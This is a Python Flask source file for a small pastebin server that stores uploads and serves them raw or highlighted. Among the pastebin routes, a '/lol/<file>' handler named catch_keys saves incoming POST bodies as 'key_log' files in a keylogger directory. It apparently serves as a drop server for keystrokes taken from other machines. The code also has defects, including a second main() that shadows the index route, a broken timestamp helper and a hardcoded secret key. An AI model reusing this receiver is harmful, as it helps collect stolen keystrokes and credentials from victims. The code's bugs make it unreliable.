#!/usr/bin/env python3

import gevent.pywsgi
from gevent.pywsgi import WSGIServer
# import gevent
from flask import Flask, abort

app = Flask(__name__)
import argparse
from pygments import highlight
from pygments.lexers import guess_lexer
from pygments.formatters import HtmlFormatter
from random import sample
import sys
import os
from time import time
from flask import request

# from werkzeug.config.fixers import ProxyFix
# from werkzeug.utils import secure_filename
server_url = 'http://localhost'
index = '/var/www/html/index.html'
favicon = '/var/www/html/favicon.ico'
rootdir = '/home/lol/pastes'
logfile = '/home/lol/logs/server.log'
host = '127.0.0.1'
port = 8080

try:
    from conf import *
except ImportError:
    print('No configuration file found ... using defaults')

if sys.flags.interactive:
    print('Interactive mode')
    parser = argparse.ArgumentParser()
    parser.add_argument("root_dir", help="Path to directory with pastes", default=rootdir)
    args = parser.parse_args()
else:
    print('Non interactive mode')
    root_dir = rootdir


def ts():
    return str(time)


def logger(data):
    with open(logfile, 'a') as log:
        log.write(data + "\n")


@app.route('/lol/<string:file>', methods=['POST', 'PUT'])
def catch_keys(file):
    try:
        filesize = request.headers.get('Content-Length')
    except Exception as err:
        err = str(err)
        logger('Error: %s \n' % err)
        return 'Error'
    try:
        if int(filesize) > 1024 * 1024 * 1024:
            abort(413)
    except Exception as err:
        logger(str(err))
        return 'Error!'
    apx = sample('XYZQCEFD1234567890', 4)
    APX = ''
    for x in apx:
        APX += x
    filename = 'key_log_' + APX
    root_dir = '/home/lol/keylogger'
    try:
        os.mkdir(root_dir + '/' + filename)
    except:
        pass
    filepath = os.path.join(root_dir, filename)
    with open(filepath + '/index.txt', 'wb') as f:
        while True:
            chunk = request.stream.read(1024)
            if chunk:
                f.write(chunk)
            else:
                break
    # return str('%s/%s\n' % (server_url, filename))
    return str('OK')


@app.route('/<string:file>', methods=['POST', 'PUT'])
def upload(file):
    apx = sample('XYZQCEFD1234567890', 4)
    APX = ''
    for x in apx:
        APX += x
    try:
        filesize = request.headers.get('Content-Length')
    except Exception as err:
        err = str(err)
        logger('Error: %s \n' % err)
        return 'Error'
    try:
        if int(filesize) > 1024 * 1024 * 1024:
            abort(413)
    except Exception as err:
        logger(str(err))
        return 'Error!'
    # filename = secure_filename(file)
    filename = APX
    try:
        os.mkdir(root_dir + '/' + filename)
    except:
        pass
    filepath = os.path.join(root_dir, filename)
    with open(filepath + '/index.txt', 'wb') as f:
        while True:
            chunk = request.stream.read(1024)
            if chunk:
                f.write(chunk)
            else:
                break
    return str('%s/%s\n' % (server_url, filename))


@app.route('/favicon.ico')
def icon():
    ico = binary_read(favicon)
    if ico:
        return ico
    else:
        return 'Not Found'


@app.route('/')
def main():
    global index
    with open(index, 'r') as ff:
        _index = ff.read()
        return _index


def binary_read(file):
    try:
        with open(file, 'rb') as b:
            code = b.read()
    except Exception as err:
        logger(str(err))
        return 'Error! File not found?'
    else:
        return code


def ascii_read(file):
    data = ""
    try:
        with open(file, 'r') as f:
            f = f.readlines()
            for line in f:
                data += line
    except Exception as err:
        logger(str(err))
        return 'Error reading file!'
    else:
        return data


@app.route('/<slug>')
@app.route('/raw/<slug>')
def raw(slug):
    # Return 404 in case of urls longer than 64 chars
    if len(slug) > 64:
        abort(404)

    # Create path for the target dir
    target_dir = os.path.join(root_dir, slug)

    # Block directory traversal attempts
    if not target_dir.startswith(root_dir):
        abort(404)

    # Check if directory with requested slug exists
    if os.path.isdir(target_dir):
        target_file = os.path.join(target_dir, "index.txt")
        # File index.txt found inside that dir
        with open(target_file) as f:
            try:
                code = f.read()
            except UnicodeDecodeError as err:
                try:
                    code = binary_read(target_file)
                except Exception as err:
                    print(err)
                    return 'Error, contact admin!'
                else:
                    print('Reading binary ')
                    return code

            else:
                print('Reading ascii')
                code = ascii_read(target_file)
                """lexer = guess_lexer(code)
                # Create formatter
                formatter = HtmlFormatter(
                    style='borland',
                    lineanchors='n',
                    encoding='latin-1'  # weird, but this works and utf-8 does not.
                )"""
                return code


@app.route('/pretty/<slug>')
@app.route('/p/<slug>')
@app.route('/<slug>/p')
def beautify(slug):
    # Return 404 in case of urls longer than 64 chars
    if len(slug) > 64:
        abort(404)

    # Create path for the target dir
    target_dir = os.path.join(root_dir, slug)

    # Block directory traversal attempts
    if not target_dir.startswith(root_dir):
        abort(404)

    # Check if directory with requested slug exists
    if os.path.isdir(target_dir):
        target_file = os.path.join(target_dir, "index.txt")
        # File index.txt found inside that dir
        with open(target_file) as f:
            try:
                code = f.read()
            except Exception as err:
                logger(str(err))
                code = binary_read(target_file)
                return code
            else:
                # Identify language
                lexer = guess_lexer(code)
                # Create formatter with line numbers
                formatter = HtmlFormatter(linenos=False, full=True)
                # Return parsed code
                if code is not None:
                    return highlight(code, lexer, formatter)
                else:
                    return "ERROR 101 : What do you think you are doing?"

    # Not found
    abort(404)


def main():
    app.secret_key = 'xHLVQGMKMZfMwls'
    app.config['SESSION_TYPE'] = 'filesystem'
    app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
    app.debug = False
    http_server = WSGIServer(('127.0.0.1', 8080), app)
    try:
        http_server.serve_forever()
    except KeyboardInterrupt:
        print('\nCaught Signal, exit\n')
        exit(0)


if __name__ == '__main__':
    main()
